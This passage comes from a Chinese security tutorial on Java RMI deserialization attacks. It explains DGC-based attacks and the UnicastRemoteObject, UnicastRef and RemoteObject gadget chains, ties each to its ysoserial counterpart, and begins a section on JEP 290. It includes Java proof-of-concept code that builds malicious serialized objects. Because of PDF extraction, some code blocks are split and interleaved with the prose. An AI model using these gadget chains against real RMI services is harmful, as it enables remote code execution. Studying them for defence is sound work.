Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使⽤
RegistryImpl_Skel 来处理。
可以在 Server 端的 ObjectTable 中找到由 Target 封装的 DGCImpl，在 Registry 端的 ObjectTable 中找到由
Target 封装的 DGCImpl_Stub。
DGC 通信的处理类是 DGCImpl_Skel 的 dispatch ⽅法，依旧通过 Java 原⽣的序列化和反序列化来处理对象。
看到这⾥就明⽩了，伴随着 RMI 服务启动的 DGC 通信，也存在被 Java 反序列化利⽤的可能。我们只需要构造⼀个
DGC 通信并在指定的位置写⼊序列化后的恶意类即可。
由于 DGC 通信和 RMI 通信在 Transport 层是同样的处理逻辑，只不过根据 Client 端写⼊的标记来区分是是由
RegistryImpl_Skel 还是 DGCImpl_Skel 来处理，因此我们可以使⽤ DGC 来攻击任意⼀个由 JRMP 协议监听的端
⼝，包括 Registry 端监听端⼝、RegistryImpl_Stub 监听端⼝、DGCImpl_Stub 监听端⼝。
不过由于后两者的端⼝号是随机的，因此通常使⽤ DGC 层来攻击 Registry 端。
这个攻击⼿段实际上就是 ysoserial 中的 ysoserial.exploit.JRMPClient 的实现原理。
五、反序列化 Gadgets
五、反序列化 Gadgets
学会了 RMI 的相关实现和漏洞利⽤⽅式，可以发现 RMI 中的⼀部分类可以⽤来组成反序列化的 Gadgets。
1. UnicastRemoteObject
java.rmi.server.UnicastRemoteObject  类通常是远程调⽤接⼝实现类的⽗类，或直接使⽤其静态⽅法
exportObject  来创建动态代理并随机监听本机端⼝以提供服务。
因此不难理解，在反序列化此类以及其⼦类后，依旧需要执⾏ exportObject  的相关操作，直接来看⼀下
UnicastRemoteObject 的 readObject  ⽅法：
会执⾏ this.reexport()  ⽅法，可以看到是直接执⾏了 exportObject  ⽅法。
那毫⽆疑问这个⽅法会触发 JRMP 监听端⼝，并会对请求进⾏解析和反序列化操作，那就可以配合 DGC 的处理逻
辑来进⾏攻击。
利⽤代码为：
public class UnicastRemoteObject1 {
  public static void main(String[] args) throws Exception {
    int port = 12233;
    // 使⽤
    Object uro   = ClassUtil.createInstanceUnsafely(UnicastRemoteObject.class);
    Field  field = UnicastRemoteObject.class.getDeclaredField("port");
    field.setAccessible(true);
    field.set(uro, port);
    // 写⼊⽗类 RemoteObject 的 ref 属性防⽌ writeObject 时报错
    Field field1 = RemoteObject.class.getDeclaredField("ref");
    field1.setAccessible(true);
反序列化调⽤链为：
这部分对应的就是 ysoserial.payloads.JRMPListener 这个 gadget，可以结合 ysoserial.exploit.JRMPListener 来使
⽤。
但 ysoserial 是使⽤了 UnicastRemoteObject 的⼦类 ActivationGroupImpl 作为实例，我们是直接使⽤ unsafe 直
接创建了 UnicastRemoteObject 对象，没有使⽤⼦类，⼤同⼩异。
2. UnicastRef
sun.rmi.server.UnicastRef  类实现了 Externalizable 接⼝，因此在其反序列化时，会调⽤其 readExternal
⽅法执⾏额外的逻辑。
UnicastRef 的 readExternal  ⽅法调⽤ LiveRef.read(var1, false)  ⽅法来还原成员变量 LiveRef ref  属
性。
LiveRef 的 read  ⽅法在创建 LiveRef 对象后，调⽤ DGCClient 的 registerRefs ⽅法来将其在环境中进⾏注册。
    field1.set(uro, new UnicastServerRef(port));
    SerializeUtil.writeObjectToFile(uro);
    SerializeUtil.readFileObject();
    // 保持进程
    Thread.sleep(100000);
  }
}
UnicastRemoteObject.readObject()
    UnicastRemoteObject.reexport()
        UnicastRemoteObject.exportObject()
            UnicastServerRef.exportObject()
                LiveRef.exportObject()
                    TCPEndpoint.exportObject()
                        TCPTransport.exportObject()
                            TCPTransport.listen()
调⽤ DGCClient$EndpointEntry#registerRefs  ⽅法
继续调⽤ makeDirtyCall  ⽅法
最后是调⽤ DGC 实现类实际是 DGCImpl_Stub 的 dirty  ⽅法进⾏通信触发反序列化。
因此可以看出，在 UnicastRef 进⾏反序列化时，会触发 DGC 通信及 dirty ⽅法调⽤，此时如果与⼀个恶意服务通
信，返回恶意数据流，则会造成反序列化漏洞。
利⽤代码：
反序列化调⽤链为：
public class UnicastRef1 {
  public static void main(String[] args) throws Exception {
    String host = "127.0.0.1";
    int    port = 12233;
    ObjID       id  = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te  = new TCPEndpoint(host, port);
    UnicastRef  ref = new UnicastRef(new LiveRef(id, te, false));
    SerializeUtil.writeObjectToFile(ref);
    SerializeUtil.readFileObject();
  }
}
恶意服务端可以结合 ysoserial.exploit.JRMPListener 来使⽤。
这条链是 lpwd 师傅提交的利⽤链，是在 ysoserial 的精简，也就是下⾯要说的链。
3. RemoteObject
RemoteObject 是⼏乎所有 RMI 远程调⽤类的⽗类。这个类也可以⽤来触发反序列化漏洞。
RemoteObject 的 readObject ⽅法会先反序列化成员变量 RemoteRef ref  ，最后调⽤其 readExternal ⽅法，可
以⽤来触发上⼀条 UnicastRef 链。
因此我们随便找⼀个 RemoteObject 的⼦类，在其实例中放⼊ UnicastRef 对象，反序列化时均可触发利⽤链。例
如如下利⽤代码，
UnicastRemoteObject.readObject()
    UnicastRemoteObject.reexport()
        UnicastRemoteObject.exportObject()
            UnicastServerRef.exportObject()
                LiveRef.exportObject()
                    TCPEndpoint.exportObject()
                        TCPTransport.exportObject()
                            TCPTransport.listen()
public class RemoteObject1 {
  public static void main(String[] args) throws Exception {
    String host = "127.0.0.1";
    int    port = 12233;
    ObjID       id  = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te  = new TCPEndpoint(host, port);
ysoserial 使⽤ RemoteObjectInvocationHandler 的代理类作为反序列化的⼊⼝点，相当于是 UnicastRef 的延⻓
链。
这部分对应的就是 ysoserial.payloads.JRMPClient 这个 gadget，恶意服务端可以结合
ysoserial.exploit.JRMPListener 来使⽤。
六、⼊深
深⼊之前我先声明⼀下：其实还有利⽤ Registry 和 Server 之间相互攻击的情况，但是由于实际环境中⼆者往往是
⼀起的，因此探究此类攻击⾏为意义不⼤，在本⽂中将会省略。
本章将会继续深⼊讨论⼀下在 RMI 攻击中的⼀些攻防和绕过的相关技术细节，对于⼀些 RMI ⾃身逻辑的更新细
节，啦啦师傅的两篇⽂章有所涉猎，这⾥也不进⾏复制粘贴了，主要讨论⼀下 JEP 290。
JEP 290
JEP290 是 Java 底层为了缓解反序列化攻击提出的⼀种解决⽅案，描述⽹址点这⾥。这是⼀个针对 JAVA 9 提出的安
全特性，但同时对 JDK 6,7,8 都进⾏了⽀持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进⾏了更新。
JEP 290 主要提供了⼏个机制：
提供了⼀种灵活的机制，将可反序列化的类从任意类限制为上下⽂相关的类（⿊⽩名单）；
限制反序列化的调⽤深度和复杂度；
为 RMI export 的对象设置了验证机制；
提供⼀个全局过滤器，可以在 properties 或配置⽂件中进⾏配置。
JEP 290 在我的历史⽂章⾥没有讨论过，这⾥我也是边学边写，主要是看了 kejaly 师傅的这篇⽂章 、隐形⼈真忙师
傅的这篇⽂章、Y4er 师傅的这篇⽂章，对此没有基础的读者可以先看这三篇⽂章学习，这⾥重点关注对于 RMI 相